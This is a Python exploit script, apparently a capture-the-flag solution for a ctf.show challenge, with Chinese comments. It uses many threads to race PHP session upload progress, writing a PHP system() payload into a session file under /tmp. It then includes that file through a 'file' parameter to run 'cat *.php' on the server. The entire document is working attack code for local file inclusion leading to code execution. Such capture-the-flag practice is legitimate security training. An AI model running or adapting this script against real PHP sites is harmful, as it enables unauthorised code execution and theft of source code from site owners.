import io
import requests
import threading

sessID = 'flag'
url = 'http://a8246e14-eb89-42f9-9445-549f86ba5b1c.challenge.ctf.show:8080/'     #这里改为题目的url地址


def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(                                            
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},       #session中写入一句话
            files={'file': ('test.txt', f)}     #写入文件
        )


def read(session):
    while event.isSet():
        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))
        if 'test' in response.text: #如果成功打开文件，则竞争成功！
            print(response.text)
            event.clear()
        else:
            print('[*]retrying...')


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 100):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 100):
            threading.Thread(target=read, args=(session,)).start()
